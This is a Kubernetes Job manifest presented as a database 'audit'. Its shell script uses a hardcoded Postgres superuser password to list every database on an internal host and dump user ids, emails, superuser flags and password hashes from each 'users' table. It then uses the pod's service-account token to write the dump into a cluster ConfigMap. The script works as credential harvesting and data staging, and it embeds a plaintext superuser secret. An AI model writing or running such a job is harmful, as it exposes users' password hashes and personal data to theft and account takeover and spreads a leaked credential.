apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v10
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client jq
          PG_HOST="172.16.10.14"
          SUPER_PASS="wpEJl3WKOImARD9WgBsa"
          
          echo "=SEARCH_USERS_TABLE=" > /tmp/out.txt
          
          # Get all databases
          DBS=$(PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -tAc "SELECT datname FROM pg_database WHERE datistemplate=false AND datname NOT IN ('postgres','rdsadmin') ORDER BY datname;" 2>&1)
          
          echo "All databases:" >> /tmp/out.txt
          echo "$DBS" >> /tmp/out.txt
          echo "" >> /tmp/out.txt
          
          # Search each database for users table
          echo "=DATABASES_WITH_USERS_TABLE=" >> /tmp/out.txt
          while IFS= read -r DB; do
            [ -z "$DB" ] && continue
            COUNT=$(PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d "$DB" -tAc "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users' AND table_schema='public';" 2>/dev/null)
            if [ "$COUNT" = "1" ]; then
              echo "DB=$DB HAS users TABLE" >> /tmp/out.txt
              PGPASSWORD="$SUPER_PASS" psql -h $PG_HOST -p 6432 -U postgres -d "$DB" -c "SELECT id, email, is_superuser, is_active, hashed_password FROM users LIMIT 10;" 2>&1 >> /tmp/out.txt
            fi
          done <<< "$DBS"
          echo "=END_SEARCH=" >> /tmp/out.txt
          
          cat /tmp/out.txt
          
          # Write to ConfigMap
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          
          PAYLOAD=$(jq -n --rawfile content /tmp/out.txt '{"data":{"result":$content}}')
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/merge-patch+json" \
            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result3" \
            -d "$PAYLOAD" > /tmp/patch.txt
          echo "Patched: $(cat /tmp/patch.txt | jq -r '.metadata.name // .message')"
          
          sleep 90